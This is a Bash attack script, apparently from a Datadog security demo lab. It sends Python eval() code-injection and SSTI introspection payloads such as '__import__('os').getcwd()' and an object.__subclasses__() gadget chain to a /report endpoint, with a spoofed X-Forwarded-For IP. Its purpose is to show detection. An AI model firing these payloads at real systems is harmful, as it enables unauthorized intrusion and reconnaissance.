#!/usr/bin/env bash
#
# python-injection.sh — vector de code injection / SSTI en Python contra /report.
# La app evalua el parametro `formula` con eval(); el atacante inyecta expresiones
# de introspeccion. Datadog lo detecta por IAST / Code Security (sink code_injection)
# en la linea exacta del eval, con el input contaminado.
#
# Uso:  ./attack/python-injection.sh http://localhost:8080
#
set -uo pipefail

TARGET="${1:-http://localhost:8080}"
ATTACKER_IP="${2:-77.88.8.8}"          # Rusia (spoof via X-Forwarded-For)
UA="python-requests/2.31"

B=$'\033[1m'; C=$'\033[36m'; G=$'\033[32m'; Y=$'\033[33m'; R=$'\033[31m'; N=$'\033[0m'

# Payloads de introspeccion/escape en Python (de menos a mas agresivos).
PAYLOADS=(
  "dir(sys)"                                         # introspeccion del modulo sys
  "sys.version"                                      # fingerprint de version
  "sys.path"                                         # rutas de import
  "__import__('os').getcwd()"                        # llega al modulo os
  "[c.__name__ for c in object.__subclasses__()][:5]" # gadget chain clasico de SSTI
)

hit() {  # descripcion formula
  local code body
  body=$(curl -s -A "$UA" -H "X-Forwarded-For: $ATTACKER_IP" \
    -G --data-urlencode "formula=$2" "$TARGET/report")
  code=$(curl -s -o /dev/null -w "%{http_code}" -A "$UA" \
    -H "X-Forwarded-For: $ATTACKER_IP" -G --data-urlencode "formula=$2" "$TARGET/report")
  local color="$G"; [ "$code" = "403" ] && color="$R"
  printf "   ${color}HTTP %s${N}  %-45s\n" "$code" "$2"
  printf "        ${C}resp:${N} %s\n" "$(echo "$body" | cut -c1-110)"
}

echo "${B}== Code injection Python contra /report  ->  $TARGET  (IP: $ATTACKER_IP) ==${N}"
echo "   El vector '+f\"{dir(sys)}\"' se envia como ?formula=dir(sys)"
echo
for p in "${PAYLOADS[@]}"; do
  hit "code-injection" "$p"
  sleep 0.4
done
echo
echo "${G}Listo.${N} En Datadog:"
echo "  - Code Security (IAST): vulnerabilidad 'Code Injection' en la linea del eval() de app.py"
echo "  - APM Traces: filtra service:prosperia-patient-api resource_name:\"GET /report\""
echo "  - El input contaminado (dir(sys), __import__...) aparece en el hallazgo"
